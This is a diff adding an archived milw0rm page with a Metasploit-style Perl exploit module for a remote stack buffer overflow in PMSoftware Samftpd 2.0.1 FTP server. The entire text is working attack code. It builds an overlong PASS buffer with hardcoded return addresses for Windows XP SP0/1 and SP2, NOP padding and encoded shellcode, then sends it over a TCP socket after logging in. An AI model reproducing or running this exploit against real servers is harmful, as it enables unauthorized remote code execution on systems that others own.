@@ -1,0 +1,125 @@
+<html><head><title>Sami FTP Server 2.0.1 Remote Buffer Overflow Exploit (meta)</title></head><pre>##
+# Written by redsand
+#
+# This is simple, look for a {call,jmp} esp
+##
+
+package Msf::Exploit::pmsoftware_samftpd;
+use base &quot;Msf::Exploit&quot;;
+use strict;
+use Pex::Text;
+
+my $advanced = { };
+
+my $info =
+  {
+	'Name'     =&gt; 'PMSoftware Samftpd Remote Exploit',
+	'Version'  =&gt; '$Revision: 1.0 $',
+	'Authors'  =&gt; [ '&lt;redsand [at] blacksecurity.org&gt;', ],
+
+	'Arch'  =&gt; [ 'x86' ],
+	'OS'    =&gt; [ 'win32', 'win2000', 'winxp', 'win2003' ],
+	'Priv'  =&gt; 0,
+
+	'AutoOpts'  =&gt; { 'EXITFUNC' =&gt; 'thread' },
+	'UserOpts'  =&gt;
+	  {
+		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+		'RPORT' =&gt; [1, 'PORT', 'The target port', 21],
+		'USER'  =&gt; [1, 'DATA', 'Username', 'redsand0wnedj00'],
+	  },
+
+	'Payload'  =&gt;
+	  {
+		'Space' =&gt; 1024,
+		'BadChars'  =&gt; &quot;\x00\x0a\x0d\x20&quot;,
+		'Keys' =&gt; ['+ws2ord'],
+	#	'Prepend' =&gt; &quot;\x81\xc4\xff\xef\xff\xff\x44&quot;,
+	  },
+
+	'Description'  =&gt;  Pex::Text::Freeform(qq{
+		This module exploits a stack overflow in the log handler of Samftpd
+	
+}),
+
+	'Refs'  =&gt;
+	  [
+		['SA18574',   'secunia.com/advisories/SA18574'],
+	  ],
+
+	'DefaultTarget' =&gt; 0,
+	'Targets' =&gt;
+	  [
+		['SamFtpd PmSoftware.exe WinXP SP0/1 Eng.', 0x71ab7bfb],
+		['SamFtpd PmSoftware.exe WinXP SP2 Eng.', 0x77daaccf],
+	  ],
+
+	'Keys'  =&gt; ['samftpd'],
+
+	'DisclosureDate' =&gt; 'Jan 25 2006',
+  };
+
+sub new {
+	my $class = shift;
+	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+	return($self);
+}
+
+sub Exploit {
+	my $self = shift;
+	my $target_host = $self-&gt;GetVar('RHOST');
+	my $target_port = $self-&gt;GetVar('RPORT');
+	my $target_idx  = $self-&gt;GetVar('TARGET');
+	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
+	my $target      = $self-&gt;Targets-&gt;[$target_idx];
+	my $header	= &quot;\x81\xc4\xff\xef\xff\xff\x44&quot;;
+
+	if (! $self-&gt;InitNops(30)) {
+		$self-&gt;PrintLine(&quot;[*] Failed to initialize the NOP module.&quot;);
+		return;
+	}
+
+	my $evil = (&quot;PASS &quot;);
+	$evil .= &quot;A&quot;x219;
+
+	$evil .= pack(&quot;V&quot;, $target-&gt;[1]) x 5 ;
+	$evil .= &quot;\x90\x90&quot; x 5; # little bit of padding
+	$evil .= $shellcode;
+	$evil .= &quot;\x0a\x0d&quot;;
+
+	my $s = Msf::Socket::Tcp-&gt;new
+	  (
+		'PeerAddr'  =&gt; $target_host,
+		'PeerPort'  =&gt; $target_port,
+		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
+	  );
+
+	$self-&gt;PrintLine(sprintf (&quot;[*] PMSoftware Samftpd Remote Exploit by redsand\@blacksecurity.org&quot;));
+
+	if ($s-&gt;IsError) {
+		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+		return;
+	}
+
+	#$self-&gt;PrintLine(sprintf (&quot;[*] Trying &quot;.$target-&gt;[0].&quot; using return address 0x%.8x....&quot;, $target-&gt;[4]));
+
+	my $r = $s-&gt;Recv(-1, 30);
+	if (! $r) { $self-&gt;PrintLine(&quot;[*] No response from FTP server&quot;); return; }
+	($r) = $r =~ m/^([^\n\r]+)(\r|\n)/;
+	$self-&gt;PrintLine(&quot;[*] $r&quot;);
+
+	$self-&gt;PrintLine(&quot;[*] Login as &quot; .$self-&gt;GetVar('USER'));
+	$s-&gt;Send(&quot;USER &quot;.$self-&gt;GetVar('USER').&quot;\r\n&quot;);
+	$r = $s-&gt;Recv(-1, 10);
+	if (! $r) { $self-&gt;PrintLine(&quot;[*] No response from FTP server&quot;); return; }
+
+	$self-&gt;PrintLine(&quot;[*] Sending evil buffer....&quot;);
+	$s-&gt;Send($evil);
+	#$r = $s-&gt;Recv(-1, 10);
+	if (! $r) { $self-&gt;PrintLine(&quot;[*] No response from FTP server&quot;); return; }
+	$self-&gt;Print(&quot;[*] $r&quot;);
+	return;
+
+}
+
+# milw0rm.com [2006-01-25]</pre></html>
